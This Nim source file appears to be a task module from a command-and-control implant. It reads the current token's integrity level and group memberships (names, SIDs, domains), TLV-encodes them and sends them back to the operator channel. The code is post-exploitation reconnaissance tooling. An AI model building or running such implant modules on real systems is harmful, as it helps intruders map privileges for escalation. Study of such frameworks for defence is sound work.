import ../client/[communication, modules, types]

import tlv

proc executeTask*(app: App, taskId: int, params: seq[string]) =
  let taskOutput = newTaskOutput taskId
  
  let tokenGroups: seq[tuple[name, sid, domain: string]] = getintegritygroups()
  let tokenIntegrity: string = getintegrity() 
  
  let b = initBuilder()
  b.addString(tokenIntegrity)
  b.addInt32(cast[int32](len tokenGroups))

  for tokenGroup in tokenGroups:
    b.addString(tokenGroup.name)
    b.addString(tokenGroup.sid)
    b.addString(tokenGroup.domain)

  taskOutput.data = b.encodeString()
  
  app.sendOutput(taskOutput)